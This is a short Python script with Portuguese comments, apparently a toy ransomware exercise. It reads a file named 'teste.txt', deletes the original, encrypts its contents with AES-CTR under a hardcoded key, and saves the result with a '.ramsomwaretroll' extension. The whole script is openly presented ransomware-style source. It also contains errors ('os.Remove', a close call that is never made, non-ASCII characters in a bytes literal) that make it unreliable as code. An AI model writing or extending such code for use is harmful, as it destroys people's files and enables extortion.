import os
import pyaes

## Abrir o arquivo a ser encriptado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remover o arquivo original
os.Remove(file_name)

## Definir a chave de incrptação
key = b"ÜùæÿR(Ö»TªØ%õh'="
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

##Salvar o arquivo criptografado
new_file = file_name + ".ramsomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close
